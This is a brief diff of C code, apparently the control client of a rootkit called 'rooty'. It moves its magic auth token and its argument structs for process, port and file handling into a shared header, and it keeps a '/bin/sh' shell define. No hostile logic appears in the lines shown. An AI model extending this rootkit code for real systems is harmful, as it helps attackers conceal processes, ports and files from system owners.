@@ -9,32 +9,10 @@
 #include <unistd.h>
 #include <string.h>
 
-#define AUTH_TOKEN 0xDEADC0DE
+#include "../common/rooty_uapi.h"
 
 #define SHELL "/bin/sh"
 
-
-struct rooty_proc_args
-{
-    pid_t pid;
-};
-
-struct rooty_port_args
-{
-    unsigned short port;
-};
-
-struct rooty_file_args
-{
-    char *name;
-    unsigned short namelen;
-};
-
-struct rooty_args
-{
-    unsigned short cmd;
-    void *ptr;
-};
 
 int main ( int argc, char *argv[] )
 {
